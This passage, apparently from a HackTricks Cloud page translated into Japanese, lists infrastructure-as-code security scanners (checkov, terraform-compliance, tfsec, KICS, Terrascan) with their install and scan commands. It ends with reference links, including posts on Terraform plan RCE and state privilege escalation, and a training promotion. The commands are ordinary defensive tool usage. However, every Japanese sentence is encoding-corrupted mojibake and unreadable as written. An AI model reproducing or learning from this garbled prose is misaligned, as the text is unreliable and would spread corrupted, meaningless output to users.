ã€[ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md) ã€ã¾ãŸã¯ [OpenTofu](https://opentofu.org/) ã‚’ä½¿ç”¨ã—ã¦ãƒ—ãƒ­ãƒ“ã‚¸ãƒ§ãƒ‹ãƒ³ã‚°ã•ã‚ŒãŸã‚¯ãƒ©ã‚¦ãƒ‰ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ã€ã‚°ãƒ©ãƒ•ãƒ™ãƒ¼ã‚¹ã®ã‚¹ã‚­ãƒ£ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãŠã‚ˆã³ã‚³ãƒ³ãƒ—ãƒ©ã‚¤ã‚¢ãƒ³ã‚¹ã®èª¤è¨­å®šã‚’æ¤œå‡ºã—ã¾ã™ã€‚

ãã‚Œã¯ã€ä¸€èˆ¬çš„ãªè„†å¼±æ€§ãŠã‚ˆã³éœ²å‡º (CVE) ã®ãŸã‚ã®ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã¨ç”»åƒã®ã‚¹ã‚­ãƒ£ãƒ³ã§ã‚ã‚‹ [ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢æ§‹æˆåˆ†æ (SCA) ã‚¹ã‚­ãƒ£ãƒ³](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md) ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

From the [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` ã¯ã€ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã‚³ãƒ¼ãƒ‰ã«å¯¾ã™ã‚‹ãƒã‚¬ãƒ†ã‚£ãƒ–ãƒ†ã‚¹ãƒˆæ©Ÿèƒ½ã‚’æœ‰åŠ¹ã«ã™ã‚‹ãŸã‚ã®ã€è»½é‡ã§ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãŠã‚ˆã³ã‚³ãƒ³ãƒ—ãƒ©ã‚¤ã‚¢ãƒ³ã‚¹ã«ç„¦ç‚¹ã‚’å½“ã¦ãŸãƒ†ã‚¹ãƒˆãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã§ã™ã€‚

* **compliance:** å®Ÿè£…ã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ãŒã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£åŸºæº–ã‚„ç‹¬è‡ªã®ã‚«ã‚¹ã‚¿ãƒ åŸºæº–ã«å¾“ã£ã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¾ã™
* **behaviour driven development:** ã»ã¼ã™ã¹ã¦ã®ã‚‚ã®ã«BDDãŒã‚ã‚Šã¾ã™ãŒã€IaCã«ã¯ãªãœãªã„ã®ã§ã—ã‚‡ã†ã‹ï¼Ÿ
* **portable:** `pip`ã‹ã‚‰ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹ã‹ã€`docker`çµŒç”±ã§å®Ÿè¡Œã™ã‚‹ã ã‘ã§ã™ã€‚ [Installation](https://terraform-compliance.com/pages/installation/)ã‚’å‚ç…§ã—ã¦ãã ã•ã„
* **pre-deploy:** ãƒ‡ãƒ—ãƒ­ã‚¤ã•ã‚Œã‚‹å‰ã«ã‚³ãƒ¼ãƒ‰ã‚’æ¤œè¨¼ã—ã¾ã™
* **easy to integrate:** ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ï¼ˆã¾ãŸã¯gitãƒ•ãƒƒã‚¯ï¼‰ã§å®Ÿè¡Œã§ãã€ã™ã¹ã¦ã®ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆãŒæ¤œè¨¼ã•ã‚Œã‚‹ã“ã¨ã‚’ä¿è¨¼ã—ã¾ã™ã€‚
* **segregation of duty:** åˆ¥ã®ãƒãƒ¼ãƒ ãŒè²¬ä»»ã‚’æŒã¤ç•°ãªã‚‹ãƒªãƒã‚¸ãƒˆãƒªã«ãƒ†ã‚¹ãƒˆã‚’ä¿æŒã§ãã¾ã™ã€‚

{% hint style="info" %}
æ®‹å¿µãªãŒã‚‰ã€ã‚³ãƒ¼ãƒ‰ãŒã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€`terraform plan`ã‚’å®Ÿè¡Œã—ã¦ã“ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚
{% endhint %}
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

From the [**docs**](https://github.com/aquasecurity/tfsec): tfsecã¯ã€ã‚ãªãŸã®terraformã‚³ãƒ¼ãƒ‰ã®é™çš„åˆ†æã‚’ä½¿ç”¨ã—ã¦ã€æ½œåœ¨çš„ãªèª¤è¨­å®šã‚’ç‰¹å®šã—ã¾ã™ã€‚

* â˜ï¸ ã™ã¹ã¦ã®ä¸»è¦ï¼ˆãŠã‚ˆã³ä¸€éƒ¨ã®ãƒã‚¤ãƒŠãƒ¼ï¼‰ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã«ã‚ãŸã‚‹èª¤è¨­å®šã‚’ãƒã‚§ãƒƒã‚¯
* â›” æ•°ç™¾ã®çµ„ã¿è¾¼ã¿ãƒ«ãƒ¼ãƒ«
* ğŸª† ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ã‚¹ã‚­ãƒ£ãƒ³ï¼ˆãƒ­ãƒ¼ã‚«ãƒ«ãŠã‚ˆã³ãƒªãƒ¢ãƒ¼ãƒˆï¼‰
* â• HCLå¼ãŠã‚ˆã³ãƒªãƒ†ãƒ©ãƒ«å€¤ã‚’è©•ä¾¡
* â†ªï¸ Terraformé–¢æ•°ã‚’è©•ä¾¡ e.g. `concat()`
* ğŸ”— Terraformãƒªã‚½ãƒ¼ã‚¹é–“ã®é–¢ä¿‚ã‚’è©•ä¾¡
* ğŸ§° Terraform CDKã¨äº’æ›æ€§ã‚ã‚Š
* ğŸ™… ãƒ¦ãƒ¼ã‚¶ãƒ¼å®šç¾©ã®Regoãƒãƒªã‚·ãƒ¼ã‚’é©ç”¨ï¼ˆãŠã‚ˆã³è£…é£¾ï¼‰
* ğŸ“ƒ è¤‡æ•°ã®å‡ºåŠ›å½¢å¼ã‚’ã‚µãƒãƒ¼ãƒˆ: lovelyï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆï¼‰ã€JSONã€SARIFã€CSVã€CheckStyleã€JUnitã€textã€Gifã€‚
* ğŸ› ï¸ è¨­å®šå¯èƒ½ï¼ˆCLIãƒ•ãƒ©ã‚°ãŠã‚ˆã³/ã¾ãŸã¯è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä»‹ã—ã¦ï¼‰
* âš¡ éå¸¸ã«é«˜é€Ÿã§ã€å¤§è¦æ¨¡ãªãƒªãƒã‚¸ãƒˆãƒªã‚’è¿…é€Ÿã«ã‚¹ã‚­ãƒ£ãƒ³å¯èƒ½
```bash
brew install tfsec
tfsec /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã‚’ã‚³ãƒ¼ãƒ‰ã¨ã—ã¦æ‰±ã†é–‹ç™ºã‚µã‚¤ã‚¯ãƒ«ã®åˆæœŸæ®µéšã§ã€**KICS** by Checkmarxã‚’ä½¿ç”¨ã—ã¦ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è„†å¼±æ€§ã€ã‚³ãƒ³ãƒ—ãƒ©ã‚¤ã‚¢ãƒ³ã‚¹ã®å•é¡Œã€ãŠã‚ˆã³ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã®èª¤è¨­å®šã‚’æ—©æœŸã«ç™ºè¦‹ã—ã¾ã™ã€‚

**KICS**ã¯**K**eeping **I**nfrastructure as **C**ode **S**ecureã®ç•¥ã§ã€ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ã§ã‚ã‚Šã€ã™ã¹ã¦ã®ã‚¯ãƒ©ã‚¦ãƒ‰ãƒã‚¤ãƒ†ã‚£ãƒ–ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã«ã¨ã£ã¦å¿…é ˆã§ã™ã€‚
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

From the [**docs**](https://github.com/tenable/terrascan): Terrascanã¯ã€Infrastructure as Codeã®ãŸã‚ã®é™çš„ã‚³ãƒ¼ãƒ‰åˆ†æãƒ„ãƒ¼ãƒ«ã§ã™ã€‚Terrascanã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ä»¥ä¸‹ã®ã“ã¨ãŒã§ãã¾ã™ï¼š

* ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã‚’ã‚³ãƒ¼ãƒ‰ã¨ã—ã¦ã‚·ãƒ¼ãƒ ãƒ¬ã‚¹ã«ã‚¹ã‚­ãƒ£ãƒ³ã—ã€èª¤è¨­å®šã‚’æ¤œå‡ºã—ã¾ã™ã€‚
* ãƒ—ãƒ­ãƒ“ã‚¸ãƒ§ãƒ‹ãƒ³ã‚°ã•ã‚ŒãŸã‚¯ãƒ©ã‚¦ãƒ‰ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã®æ§‹æˆå¤‰æ›´ã‚’ç›£è¦–ã—ã€ãƒã‚¹ãƒãƒ£ãƒ¼ãƒ‰ãƒªãƒ•ãƒˆã‚’å¼•ãèµ·ã“ã™å¤‰æ›´ã‚’æ¤œå‡ºã—ã€å®‰å…¨ãªãƒã‚¹ãƒãƒ£ãƒ¼ã«æˆ»ã™ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚
* ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è„†å¼±æ€§ã‚„ã‚³ãƒ³ãƒ—ãƒ©ã‚¤ã‚¢ãƒ³ã‚¹é•åã‚’æ¤œå‡ºã—ã¾ã™ã€‚
* ã‚¯ãƒ©ã‚¦ãƒ‰ãƒã‚¤ãƒ†ã‚£ãƒ–ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã‚’ãƒ—ãƒ­ãƒ“ã‚¸ãƒ§ãƒ‹ãƒ³ã‚°ã™ã‚‹å‰ã«ãƒªã‚¹ã‚¯ã‚’è»½æ¸›ã—ã¾ã™ã€‚
* ãƒ­ãƒ¼ã‚«ãƒ«ã§å®Ÿè¡Œã™ã‚‹æŸ”è»Ÿæ€§ã‚„ã€CI\CDã¨çµ±åˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
brew install terrascan
```
## å‚è€ƒæ–‡çŒ®

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
